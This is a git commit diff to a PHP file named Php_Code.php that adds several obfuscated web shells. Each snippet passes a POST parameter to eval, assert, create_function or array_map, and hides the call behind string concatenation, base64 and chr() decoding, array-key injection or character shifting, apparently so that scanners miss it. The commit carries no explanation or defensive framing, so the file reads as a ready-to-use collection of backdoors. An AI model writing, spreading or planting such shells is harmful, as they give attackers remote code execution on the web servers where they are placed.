fd6bbe7a635a447a703422ec27ca8f15bb65b8ca
Szrzvdny <317718435@qq.com>
2017-08-24 22:07:12 +0800

    Update Php_Code.php

--- Php_Code.php
+++ Php_Code.php
@@ -4,3 +4,34 @@ $e=trim($str,'ert').str_repeat('s',2).trim($str,'art').trim($str,'aet').trim($st
 //拼接成asssert 
 $e($_POST['M']);
 ?>
+
+<?php $d ="dd";function dd($d){eval($d);}@dd($_POST['kv']);?>
+
+<?php
+$args = 1;
+$arr=array("n;}$_POST[x];/*"=>"test");
+$arr1=array_flip($arr);
+$arr2 = $arr1[test];
+create_function('$args',$arr2); 
+?>
+
+<?php $ran_ ='cmFuZ2U=';$ran__ = 'ba'.'se'.'64'.'_decode';$int_ = $ran__($ran_);$int__= $int_(0,200);$ch_ = 'c'.'h'.'r';$ch__=$ch_($int__[97]).$ch_($int__[115]).$ch_($int__[115]);$ch___=$ch_($int__[101]).$ch_($int__[114]).$ch_($int__[116]);$ass = $ch__.$ch___;@$ass($_POST['x']);?>
+
+<?php
+$_DD = "ev";$DDD .= "a";$DDD .= "L";$DD1 = "(";$DD2 = "$";$DD3 = "_PO";$DD .= "ST['";$DD .= "D@";$DD .= "5d_";$DD .= "gov";$DDx = "0'";$DD4 = "])";$DD5 = ";";@evAl($_DD.$DDD.$DD1.$DD2.$DD3.$DD.$DDx.$DD4.$DD5);
+//??????D@5d_gov0
+?>
+
+<?php $xy = "eval"; $xy .= "(";$xy .= "$";$xy .= "_PO";$xy .= "ST['akkuman']);";@eval($xy);?>
+
+<script language="php">
+@array_map('a'.'s'.'s'.'e'.'r'.'t',array($_POST['fanzao']));
+</script>
+
+<?php
+        $arr="j{fq-)dUTXY`}b.@"; 
+        for($i=0;$i< strlen($arr);$i++){
+                $arr[$i]=chr(ord($arr[$i])-5);
+        }
+        eval($arr);
+?>
